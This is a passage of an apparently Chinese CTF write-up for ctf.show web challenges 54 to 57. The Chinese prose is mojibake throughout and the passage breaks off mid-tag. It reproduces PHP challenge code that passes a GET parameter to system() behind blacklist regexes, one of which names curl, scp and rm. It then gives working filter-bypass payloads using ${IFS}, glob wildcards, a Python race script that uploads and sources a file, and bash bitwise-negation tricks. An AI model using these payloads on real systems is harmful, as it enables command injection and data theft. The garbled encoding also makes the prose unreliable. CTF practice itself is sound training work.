æ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ–‡æœ¬å¤„ç†å·¥å…·ã€‚</li><li><code>.*s.*t.*r.*i.*n.*g.*s.*</code> ï¼šæŸ¥æ‰¾åŒ…å« <code>strings</code>  çš„å­—ç¬¦ä¸²ï¼Œ <code>strings</code>  å‘½ä»¤ç”¨äºæå–äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„å¯æ‰“å°å­—ç¬¦ä¸²ã€‚</li><li><code>.*o.*d.*</code> ï¼šæŸ¥æ‰¾åŒ…å« <code>od</code>  çš„å­—ç¬¦ä¸²ï¼Œ <code>od</code> ï¼ˆå…«è¿›åˆ¶è½¬å‚¨ï¼‰å‘½ä»¤ç”¨äºä»¥å…«è¿›åˆ¶æˆ–å…¶ä»–æ ¼å¼è½¬å‚¨æ–‡ä»¶å†…å®¹ã€‚</li><li><code>.*c.*u.*r.*l.*</code> ï¼šæŸ¥æ‰¾åŒ…å« <code>curl</code>  çš„å­—ç¬¦ä¸²ï¼Œ <code>curl</code>  æ˜¯ä¸€ä¸ªç”¨äºä¼ è¾“æ•°æ®çš„å‘½ä»¤è¡Œå·¥å…·ã€‚</li><li><code>.*n.*l.*</code> ï¼šå¯èƒ½æ„å›¾æŸ¥æ‰¾åŒ…å« <code>nl</code>  çš„å­—ç¬¦ä¸²ï¼Œä½†æ­¤æ¨¡å¼è¾ƒä¸ºå®½æ³›ï¼Œå› ä¸º <code>n</code>  å’Œ <code>l</code>  æ˜¯å¸¸è§å­—æ¯ã€‚</li><li><code>.*s.*c.*p.*</code> ï¼šæŸ¥æ‰¾åŒ…å« <code>scp</code>  çš„å­—ç¬¦ä¸²ï¼Œ <code>scp</code>  æ˜¯å®‰å…¨å¤åˆ¶å‘½ä»¤ï¼Œç”¨äºåœ¨æœ¬åœ°å’Œè¿œç¨‹ä¹‹é—´å®‰å…¨åœ°ä¼ è¾“æ–‡ä»¶ã€‚</li><li><code>.*r.*m.*</code> ï¼šæŸ¥æ‰¾åŒ…å« <code>rm</code>  çš„å­—ç¬¦ä¸²ï¼Œ <code>rm</code>  å‘½ä»¤ç”¨äºåˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ã€‚</li><li><code>\</code> ã€ <code>%</code> ã€ <code>\x09</code> ã€ <code>\x26</code> ã€ <code>&gt;</code> ã€ <code>&lt;</code> ï¼šæŸ¥æ‰¾åå¼•å·ï¼ˆ```ï¼‰ã€ç™¾åˆ†å·ï¼ˆ <code>%</code> ï¼‰ã€åˆ¶è¡¨ç¬¦ï¼ˆ <code>\x09</code> ï¼‰ã€ <code>&amp;</code>  ç¬¦å·çš„ HTML å®ä½“ï¼ˆ <code>\x26</code> ï¼‰ã€å¤§äºå·ï¼ˆ <code>&gt;</code> ï¼‰ã€å°äºå·ï¼ˆ <code>&lt;</code> ï¼‰ï¼Œè¿™äº›å­—ç¬¦æˆ–æ¨¡å¼å¯èƒ½åœ¨å°è¯•æ‰§è¡Œå‘½ä»¤æˆ–æ³¨å…¥ä»£ç æ—¶å…·æœ‰ç‰¹æ®Šæ„ä¹‰ã€‚</li></ol><p>æ•´ä¸ªæ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨äº† <code>i</code>  ä¿®é¥°ç¬¦ï¼Œè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ã€‚å¦‚æœ <code>preg_match</code>  è¿”å› <code>false</code> ï¼ˆå³æ²¡æœ‰æ‰¾åˆ°åŒ¹é…é¡¹ï¼‰ï¼Œåˆ™æ„å‘³ç€å­—ç¬¦ä¸² <code>$c</code>  ä¸åŒ…å«ä¸Šè¿°ä»»ä½•æ•æ„Ÿæ¨¡å¼æˆ–å­—ç¬¦ã€‚è¿™é€šå¸¸ç”¨äºå®‰å…¨æ£€æŸ¥ï¼Œä»¥é˜²æ­¢æ½œåœ¨çš„æ¶æ„è¾“å…¥ã€‚</p></blockquote><p>â€‹è¿™é‡Œç›´æ¥ç”¨ä¸‹é¢è¿™ä¸ªæ–¹å¼ç»•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=grep$&#123;IFS&#125;<span class="string">&#x27;&#123;&#x27;</span>$&#123;IFS&#125;fl???php</span><br><span class="line">ï¼ˆåœ¨ fl???phpåŒ¹é…åˆ°çš„æ–‡ä»¶ä¸­ï¼ŒæŸ¥æ‰¾å«æœ‰&#123;çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºåŒ…å« &#123; çš„è¿™ä¸€è¡Œï¼‰</span><br></pre></td></tr></table></figure><h1 id="web55"><a class="markdownIt-Anchor" href="#web55">#</a> Web55ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹ç»ˆäºåˆ°äº†æ–°ç©æ„å„¿äº†ï¼Œæ— å­—æ¯ RCEï¼Œæœ‰å‡ ç§æ–¹æ³•ï¼š<br>æŸ¥çœ‹æºä»£ç å‘ç°æ²¡æœ‰è¿‡æ»¤æ•°å­—ï¼Œæˆ‘ä»¬å°±æƒ³ä¸€æƒ³åœ¨æˆ‘ä»¬æŸ¥çœ‹æ–‡ä»¶çš„å‘½ä»¤æœ‰æ²¡æœ‰æ•°å­—å¼€å¤´çš„ã€‚<br>åŒ¹é…åˆ° /bin ç›®å½•ä¸‹çš„å‘½ä»¤<br> catã€cpã€chmod dfã€dmesgã€gzipã€killã€lsã€mkdirã€moreã€mountã€rmã€suã€tarã€base64 ç­‰<br>å‘ç°å­˜åœ¨ä¸€ä¸ª base64<br> æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡é€šé…ç¬¦è¿›è¡ŒåŒ¹é…å‘½ä»¤æ‰§è¡ŒæŸ¥çœ‹ flag.php<br>payloadï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/????64 ????.???</span><br><span class="line">æ„æ€æ˜¯ /bin/base64 flag.php</span><br></pre></td></tr></table></figure><h1 id="web56"><a class="markdownIt-Anchor" href="#web56">#</a> Web56ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è§£é¢˜æ€è·¯ï¼šè¿‡æ»¤äº†åˆ†å·ï¼Œå­—æ¯ï¼Œæ•°å­—ç­‰ç­‰ç¬¦å·</span><br><span class="line">æœ¬é¢˜æ²¡æœ‰è¿‡æ»¤ç¬¦å·.(ç‚¹)ï¼Œå› æ­¤å¯ä»¥æƒ³åˆ°linuxä¸­è¯¥ç¬¦å·.(ç‚¹)çš„ç”¨æ³•ï¼Œä¸sourceå‘½ä»¤ç”¨æ³•ç›¸åŒï¼šlinxuä¸­sourceå‘½ä»¤å’Œ.(ç‚¹)</span><br><span class="line">æ€»ä½“åˆ†æåï¼Œå¯ä»¥postä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶ï¼Œå†…å®¹ä¸ºæ‰€éœ€æ‰§è¡Œçš„linuxæŒ‡ä»¤ï¼Œç„¶åä½¿ç”¨globé€šé…ç¬¦å’Œ.(ç‚¹)æ¥å°†å…¶ä¸­çš„å†…å®¹ä»¥linuxæŒ‡ä»¤çš„å½¢å¼æ¥è¿›è¡Œæ‰§è¡Œã€‚</span><br></pre></td></tr></table></figure><p>â€‹è¿˜æ˜¯ systemï¼Œä¸è¿‡è¿™æ¬¡å¤šè¿‡æ»¤äº†å­—æ¯ã€‚ç”¨ä¸‹é¢è¿™ä¸ªè„šæœ¬å»è·‘ï¼Œä¸è¿‡åŸç†ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œè´´ä¸€ä¸ªé“¾æ¥ï¼Œæœ‰æ¡ä»¶å°±å»å­¦ä¹ ä¸€ä¸‹ã€‚</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnNpbmEuY29tLmNuL3MvYmxvZ19hZjY4YTJjMjAxMDE2bmgyLmh0bWw=">LINUX ä¸­çš„ç‚¹å‘½ä»¤ï¼Œæˆ– source å‘½ä»¤ï¼Œæˆ–ç‚¹ç¬¦å·</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vd2Vic2hlbGwtd2l0aG91dC1hbHBoYW51bS1hZHZhbmNlZC5odG1s">æ— å­—æ¯æ•°å­— webshell ä¹‹æé«˜ç¯‡</span></p><p>â€‹python è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c7ab10d0-d6da-40f4-8e90-c56abda22ce1.challenge.ctf.show/&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;c&quot;</span>:<span class="string">&quot;. /???/????????[@-[]&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;.\\a.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: file&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        r = requests.post(url,params=payload,files=files)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + r.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;.&quot;</span>, end=<span class="string">&#x27; &#x27;</span>,flush=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>â€‹å¦å¤–è¿˜éœ€è¦åˆ›å»ºä¸€ä¸ª a.txt æ–‡ä»¶ï¼Œé‡Œé¢çš„å†…å®¹ä¸º cat flag.php</p><h1 id="web57"><a class="markdownIt-Anchor" href="#web57">#</a> Web57ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¿˜èƒ½ç‚«çš„åŠ¨å—ï¼Ÿ</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªä¼¼ä¹å¯ä»¥å–ååšï¼š</p><blockquote><p>åœ¨ liunx ä¸­ï¼Œ$(()) ä¸º 0 , <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(()))) ä¸º - 1 ~<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>ä»£è¡¨å–åï¼Œ</mtext><mn>0</mn><mtext>å–ååä¸º</mtext><mo>âˆ’</mo><mn>1</mn><mtext>ï¼Œè¿™æ ·å°±å¯ä»¥å…ˆæ„é€ å‡º</mtext><mo>âˆ’</mo><mn>37</mn><mtext>ï¼Œå–ååå°±ä¸º</mtext><mn>36</mn><mtext>ï¼Œä¹Ÿå°±æ˜¯</mtext></mrow><annotation encoding="application/x-tex">ä»£è¡¨å–åï¼Œ0å–ååä¸º-1ï¼Œè¿™æ ·å°±å¯ä»¥å…ˆæ„é€ å‡º-37ï¼Œå–ååå°±ä¸º36ï¼Œä¹Ÿå°±æ˜¯</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">ä»£</span><span class="mord cjk_fallback">è¡¨</span><span class="mord cjk_fallback">å–</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord">0</span><span class="mord cjk_fallback">å–</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">ä¸º</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">è¿™</span><span class="mord cjk_fallback">æ ·</span><span class="mord cjk_fallback">å°±</span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">ä»¥</span><span class="mord cjk_fallback">å…ˆ</span><span class="mord cjk_fallback">æ„</span><span class="mord cjk_fallback">é€ </span><span class="mord cjk_fallback">å‡º</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">7</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">å–</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">å°±</span><span class="mord cjk_fallback">ä¸º</span><span class="mord">3</span><span class="mord">6</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">ä¹Ÿ</span><span class="mord cjk_fallback">å°±</span><span class="mord cjk_fallback">æ˜¯</span></span></span></span> (()) ä¸­æœ‰ 37 ä¸ª<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(()))) åœ¨åŠ ä¸Šå–åï¼Œä¹Ÿå°±æ˜¯<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(()))) ä¸­æœ‰ 37 ä¸ª - 1</p></blockquote><p>â€‹å…ˆè´´ä¸€ä¸ªæ— å­—æ¯æ•°å­— RCE çš„æ€»ç»“ï¼š</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvODEwNz90aW1lX18xMzExPW40JTJCeG5EMERjN0dRRHREa1dHT0RsaGplMCUzRDZBZ2doaXJPTW93aUQ=">æ— å­—æ¯æ•°å­— webshell æ€»ç»“</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYxNzc4MTI4L2FydGljbGUvZGV0YWlscy8xMjcwNjM0MDc/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjJENjgxNDdERS1BRUIzLTRCMUUtQjEyRC03NjE5RTREQzEzNTElMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmFsbC4lMjUyMiUyNTdEJmFtcDtyZXF1ZXN0X2lkPUQ2ODE0N0RFLUFFQjMtNEIxRS1CMTJELTc2MTlFNERDMTM1MSZhbXA7Yml6X2lkPTAmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19zZWFyY2hfcmVzdWx0Lm5vbmUtdGFzay1ibG9nLTJ+YWxsfmZpcnN0X3JhbmtfZWNwbV92MX5yYW5rX3YzMV9lY3BtLTEtMTI3MDYzNDA3LW51bGwtbnVsbC4xNDIlNUV2MTAwJTVFcGNfc2VhcmNoX3Jlc3VsdF9iYXNlNiZhbXA7dXRtX3Rlcm09bGludXglRTUlOEYlOTYlRTUlOEYlOEQlRTUlOTElQkQlRTQlQkIlQTRyY2UlRTglODQlOUElRTYlOUMlQUMmYW1wO3NwbT0xMDE4LjIyMjYuMzAwMS40MTg3">æ— æ•°å­—å­—æ¯ rce æ€»ç»“ï¼ˆå–åã€å¼‚æˆ–ã€è‡ªå¢ã€ä¸´æ—¶æ–‡ä»¶ï¼‰</span></p><p>â€‹å¯æƒœï¼Œåšé¢˜çš„è¿™ä¸ªè€ƒç‚¹ä¼¼ä¹è¿™ä¸¤ç¯‡æ–‡ç« é‡Œæ²¡æœ‰ï¼š</p><blockquote><p>åŒå°æ‹¬å· (()) æ˜¯ Bash Shell ä¸­ä¸“é—¨ç”¨æ¥è¿›è¡Œæ•´æ•°è¿ç®—çš„å‘½ä»¤ï¼Œå®ƒçš„æ•ˆç‡å¾ˆé«˜ï¼Œå†™æ³•çµæ´»ï¼Œæ˜¯ä¼ä¸šè¿ç»´ä¸­å¸¸ç”¨çš„è¿ç®—å‘½ä»¤ã€‚ é€šä¿—åœ°è®²ï¼Œå°±æ˜¯å°†æ•°å­¦è¿ç®—è¡¨è¾¾å¼æ”¾åœ¨ ((å’Œ)) ä¹‹é—´ã€‚ è¡¨è¾¾å¼å¯ä»¥åªæœ‰ä¸€ä¸ªï¼Œä¹Ÿå¯ä»¥æœ‰å¤šä¸ªï¼Œå¤šä¸ªè¡¨è¾¾å¼ä¹‹é—´ä»¥é€—å·ï¼Œåˆ†éš”ã€‚å¯¹äºå¤šä¸ªè¡¨è¾¾å¼çš„æƒ…å†µï¼Œä»¥æœ€åä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼ä½œä¸ºæ•´ä¸ª (( )) å‘½ä»¤çš„æ‰§è¡Œç»“æœã€‚ å¯ä»¥ä½¿ç”¨<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>è·å–</mtext><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mtext>å‘½ä»¤çš„ç»“æœï¼Œè¿™å’Œä½¿ç”¨</mtext></mrow><annotation encoding="application/x-tex">è·å– (( )) å‘½ä»¤çš„ç»“æœï¼Œè¿™å’Œä½¿ç”¨</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">è·</span><span class="mord cjk_fallback">å–</span><span class="mopen">(</span><span class="mopen">(</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord cjk_fallback">å‘½</span><span class="mord cjk_fallback">ä»¤</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">ç»“</span><span class="mord cjk_fallback">æœ</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">è¿™</span><span class="mord cjk_fallback">å’Œ</span><span class="mord cjk_fallback">ä½¿</span><span class="mord cjk_fallback">ç”¨</span></span></span></span>è·å¾—å˜é‡å€¼æ˜¯ç±»ä¼¼çš„ã€‚ å¯ä»¥åœ¨ (()) å‰é¢åŠ ä¸Š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>ç¬¦å·è·å–</mtext><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mtext>å‘½ä»¤çš„æ‰§è¡Œç»“æœï¼Œä¹Ÿå³è·å–æ•´ä¸ªè¡¨è¾¾å¼çš„å€¼ã€‚ä»¥</mtext><mi>c</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">ç¬¦å·è·å– (( )) å‘½ä»¤çš„æ‰§è¡Œç»“æœï¼Œä¹Ÿå³è·å–æ•´ä¸ªè¡¨è¾¾å¼çš„å€¼ã€‚ä»¥ c=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">ç¬¦</span><span class="mord cjk_fallback">å·</span><span class="mord cjk_fallback">è·</span><span class="mord cjk_fallback">å–</span><span class="mopen">(</span><span class="mopen">(</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord cjk_fallback">å‘½</span><span class="mord cjk_fallback">ä»¤</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">æ‰§</span><span class="mord cjk_fallback">è¡Œ</span><span class="mord cjk_fallback">ç»“</span><span class="mord cjk_fallback">æœ</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">ä¹Ÿ</span><span class="mord cjk_fallback">å³</span><span class="mord cjk_fallback">è·</span><span class="mord cjk_fallback">å–</span><span class="mord cjk_fallback">æ•´</span><span class="mord cjk_fallback">ä¸ª</span><span class="mord cjk_fallback">è¡¨</span><span class="mord cjk_fallback">è¾¾</span><span class="mord cjk_fallback">å¼</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">å€¼</span><span class="mord cjk_fallback">ã€‚</span><span class="mord cjk_fallback">ä»¥</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>((a+b)) ä¸ºä¾‹ï¼Œå³å°† a+b è¿™ä¸ªè¡¨è¾¾å¼çš„è¿ç®—ç»“æœèµ‹å€¼ç»™å˜é‡ cã€‚ æ³¨æ„ï¼Œç±»ä¼¼ c=((a+b)) è¿™æ ·çš„å†™æ³•æ˜¯é”™è¯¯çš„ï¼Œä¸åŠ  $ å°±ä¸èƒ½å–å¾—è¡¨è¾¾å¼çš„ç»“æœã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;_&#125; #è¿”å›ä¸Šä¸€æ¬¡çš„æ‰§è¡Œç»“æœ`</span><br><span class="line">echo $(()) #0</span><br><span class="line">echo $((~$(()))) #~0æ˜¯-1</span><br><span class="line">$(($((~$(())))$((~$(()))))) #$((-1-1))å³$$((-2))æ˜¯-2</span><br><span class="line">echo $((~-37)) #~-37æ˜¯36</span><br></pre></td></tr></table></figure><p>â€‹æ‰€ä»¥ payloadï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="built_in">$</span>((~<span class="built_in">$</span>((<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))))))</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥ç”¨è¿™ä¸ªè„šæœ¬ç”Ÿæˆç®€å•çš„æ•°å­—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">num_1 = <span class="string">&quot;$((~$(())))&quot;</span></span><br><span class="line">inta = <span class="number">36</span></span><br><span class="line">resp = <span class="string">&quot;$((~$((&quot;</span>+ num_1 * <span class="number">37</span>  +<span 